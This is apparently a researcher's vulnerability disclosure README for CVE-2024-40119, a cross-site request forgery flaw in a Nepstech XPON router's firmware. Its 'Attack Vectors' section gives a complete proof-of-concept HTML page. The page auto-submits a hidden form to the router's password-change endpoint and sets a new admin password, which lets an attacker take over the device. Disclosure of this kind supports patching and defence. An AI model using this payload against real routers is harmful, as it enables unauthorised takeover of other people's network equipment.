# nepstech-xpon-router-CVE-2024-40119

# Author:
Subhodeep Baroi

# CVE-2024-40119: CSRF Vulnerability in Nepstech Wifi Router NTPL-XPON1GFEVN v1.0

## Description

**CVE-2024-40119** is a Cross-Site Request Forgery (CSRF) vulnerability in the Nepstech Wifi Router xpon NTPL-XPON1GFEVN v1.0 firmware v2.0.1. This vulnerability allows remote attackers to change the admin password without the user's consent, leading to a potential account takeover.

## Details

- **Vulnerability Type:** Cross-Site Request Forgery (CSRF)
- **Vendor of Product:** Nepstech
- **Affected Product Code Base:** Wifi Router xpon (terminal) - Model: NTPL-XPON1GFEVN - Version: 1.0 and Firmware: V2.0.1
- **Affected Component:** Router web app password-changing functionality
- **Attack Type:** Remote
- **Impact:** Admin Account Takeover

## Attack Vectors

A remote attacker can craft a malicious HTML page that triggers the password change functionality when visited by an authenticated user. Below is a sample attack vector:

```html
<!DOCTYPE html>
<html>
  <body>
    <form action="http://192.168.1.1/cgi-bin/mag-account.asp" method="POST">
      <input type="hidden" name="name0" value="admin" />
      <input type="hidden" name="name1" value="user" />
      <input type="hidden" name="name2" value="user3" />
      <input type="hidden" name="oldUsername" value="admin" />
      <input type="hidden" name="newUsername" value="" />
      <input type="hidden" name="oldPassword" value="" />
      <input type="hidden" name="newPassword" value="UserUser2&#64;" />
      <input type="hidden" name="cfmPassword" value="UserUser2&#64;" />
      <input type="hidden" name="accountflg" value="1" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
